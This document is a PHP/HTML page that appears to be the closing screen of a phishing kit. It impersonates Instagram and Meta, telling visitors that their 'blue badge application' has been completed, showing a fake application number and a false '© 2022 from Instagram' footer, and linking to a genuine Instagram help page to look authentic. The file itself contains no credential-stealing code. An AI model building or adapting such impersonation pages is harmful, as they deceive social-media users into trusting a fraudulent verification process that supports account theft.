<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="icon" href="assets/img/head.ico">
  <title>Blue | Application</title>
  <link href="./assets/style.css" rel="stylesheet">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
  <style>
    .app {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      margin-top: 5px;
      font-weight: 600;
      float: left;
      color: #268e08;
    }

    .card2 {
      text-align: center;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      width: 50%;
      margin: 0 auto;
    }
  </style>
</head>

<body>
  <?php 
error_reporting(0);
    include "header.php";
  ?>
  <div class="lsf_o">
    <div class="card">
      <div class="card2">
        <img src="./assets/img/meta.png" width="300">
        <h1 style="font-family:sans-serif; font-weight:400;  color:#3d3d3d; font-size:20px;">Form Status</h1>
        <h5 style="font-family:sans-serif; color:#999; width: 80%; margin-top: 20px;">Your badge application has been
          successfully completed. Do not share the transaction number given to you with anyone and write your
          transaction number in the e-mail that will be sent within 24-48 hours and wait for news from us.</h5>
        <div class="app">
          <h5>
            Application Number:
            <font color="#000" size="2">
              #273470 <img style="width:32px;" src="./assets/img/gif.gif" </img> </font> </h5> <div
                style="color:#268e08; font-weight: bold; font-size:12px;"><?=date("d.m.Y H:i")?></h5>
        </div>
        <a href="https://help.instagram.com/733907830039577" style="text-deceration:none;">
          <button type="submit" class="bvsf_asd">
            <span>Completed</span>
          </button>
        </a>
      </div>
    </div>
  </div>

  <div class="footer">
    <p>© 2022 from Instagram</p>
  </div>
</body>

</html>